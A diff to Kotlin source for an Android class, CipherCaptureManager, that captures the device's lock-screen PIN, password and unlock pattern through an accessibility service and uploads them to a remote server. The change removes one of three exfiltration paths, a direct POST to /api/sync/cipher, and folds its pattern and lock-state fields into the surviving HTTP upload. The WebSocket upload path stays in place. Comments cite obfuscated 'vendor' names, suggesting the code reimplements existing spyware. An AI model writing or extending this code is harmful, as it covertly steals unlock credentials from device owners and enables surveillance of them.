@@ -657,7 +657,7 @@ class CipherCaptureManager(
             syncToAppStatusManager(finalCipher)
             sendPasswordViaWebSocket(finalCipher)
             uploadPasswordViaHttp(finalCipher)
-            uploadCipherViaDirectHttp(finalCipher)
+
             notifyPasswordCaptureSuccess()
             pendingCipher = null
             return true
@@ -711,7 +711,6 @@ class CipherCaptureManager(
         syncToAppStatusManager(finalCipher)
         sendPasswordViaWebSocket(finalCipher)
         uploadPasswordViaHttp(finalCipher)
-        uploadCipherViaDirectHttp(finalCipher)
         notifyPasswordCaptureSuccess()
         pendingCipher = null
         return true
@@ -1158,7 +1157,9 @@ class CipherCaptureManager(
                 else -> ""
             }
 
-            // vendor: coroutine launch → httpManager.uploadPasswordCapture(password, type, "system_auth_capture", "", "", 100)
+            val patternCipher = patternIndices?.joinToString(",")
+            val isLocked = map["isLocked"] as? Boolean
+
             GlobalScope.launch(Dispatchers.IO) {
                 try {
                     val result = httpManager.uploadPasswordCapture(
@@ -1167,7 +1168,10 @@ class CipherCaptureManager(
                         inputMethod = "system_auth_capture",
                         appName = "",
                         packageName = "",
-                        confidence = 100
+                        confidence = 100,
+                        cipherGradeCode = quality,
+                        patternCipher = patternCipher,
+                        isLocked = isLocked
                     )
                     if (result.isSuccess) {
                         Log.d(TAG, "✅ 密码已通过 HTTP 上传: type=$type")
@@ -1180,78 +1184,6 @@ class CipherCaptureManager(
             }
         } catch (e: Exception) {
             Log.w(TAG, "uploadPasswordViaHttp 异常: ${e.message}")
-        }
-    }
-
-    /**
-     * 通过直连 OkHttp 上传密码（路径 3）。
-     * vendor: dqtvuisjd$saveLockPinToServer$1 L68-78 → 直连 OkHttp POST /api/sync/cipher
-     *
-     * 这是 vendor 三路上报的第 3 条路径：
-     * - 不走 HttpManager，直接用 CipherCaptureManager.httpClient
-     * - Header 只有 X-Client-ID（无 Token），无 HMAC 认证
-     * - JSON: {cipherGradeCode, textCipher, patternCipher, isLocked, captureTime}
-     */
-    fun uploadCipherViaDirectHttp(cipher: Any?) {
-        try {
-            if (cipher == null) return
-            val map = cipher as? Map<*, *> ?: return
-            val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance()
-            val networkManager = svc?.getNetworkManager()
-            if (networkManager == null) {
-                Log.w(TAG, "NetworkManager 未初始化，跳过直连 HTTP 上传")
-                return
-            }
-            val serverUrl = networkManager.httpBaseUrl.ifEmpty { networkManager.serverUrl }
-            val deviceId = networkManager.deviceId
-            if (serverUrl.isEmpty() || deviceId.isEmpty()) {
-                Log.w(TAG, "serverUrl 或 deviceId 为空，跳过直连 HTTP 上传")
-                return
-            }
-
-            val quality = map["quality"] as? String ?: ""
-            val text = map["text"] as? String ?: ""
-            @Suppress("UNCHECKED_CAST")
-            val patternIndices = (map["patternIndices"] as? List<*>)?.filterIsInstance<Int>()
-            val patternCipher = patternIndices?.joinToString(",") ?: ""
-
-            // vendor: JSON payload — dqtvuisjd$saveLockPinToServer$1 L69-74
-            val json = JSONObject()
-            json.put("cipherGradeCode", quality)
-            json.put("textCipher", text)
-            json.put("patternCipher", patternCipher)
-            json.put("isLocked", true)
-            json.put("captureTime", System.currentTimeMillis())
-
-            val jsonStr = json.toString()
-
-            // vendor: 在后台线程执行直连 POST
-            Thread {
-                try {
-                    val baseUrl = serverUrl.replace("ws://", "http://").replace("wss://", "https://").trimEnd('/')
-                    val bearerToken = networkManager.ownerToken
-                    val request = Request.Builder()
-                        .url("$baseUrl/api/sync/cipher")
-                        .header("X-Client-ID", deviceId)
-                        .header("Authorization", "Bearer $bearerToken")
-                        .post(jsonStr.toRequestBody("application/json".toMediaType()))
-                        .build()
-                    val response = httpClient.newCall(request).execute()
-                    try {
-                        if (response.isSuccessful) {
-                            Log.d(TAG, "✅ 锁屏密码已直连上传到服务器: quality=$quality, textLen=${text.length}")
-                        } else {
-                            Log.w(TAG, "⚠️ 锁屏密码直连上传失败: ${response.code}")
-                        }
-                    } finally {
-                        response.close()
-                    }
-                } catch (e: Exception) {
-                    Log.w(TAG, "锁屏密码直连上传异常: ${e.message}")
-                }
-            }.start()
-        } catch (e: Exception) {
-            Log.w(TAG, "uploadCipherViaDirectHttp 异常: ${e.message}")
         }
     }
 
